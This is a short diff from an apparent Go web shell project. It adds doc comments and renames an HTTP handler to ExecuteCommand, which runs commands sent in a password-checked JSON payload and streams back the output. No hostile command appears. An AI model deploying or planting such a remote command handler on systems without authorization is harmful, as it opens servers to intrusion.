@@ -8,6 +8,7 @@ import (
 	"webshell/lib/shell"
 )
 
+// RequiredPassword is the password the app is expecting to get in the json payload
 var RequiredPassword *string
 
 func decodeRequest(r *http.Request) (common.Command, error) {
@@ -30,7 +31,8 @@ func verifyPassword(givenPassword string) error {
 	return nil
 }
 
-func Handler(w http.ResponseWriter, r *http.Request) {
+// ExecuteCommand Executes the command passed as json payload and stream results back
+func ExecuteCommand(w http.ResponseWriter, r *http.Request) {
 	command, err := decodeRequest(r)
 
 	if err != nil {
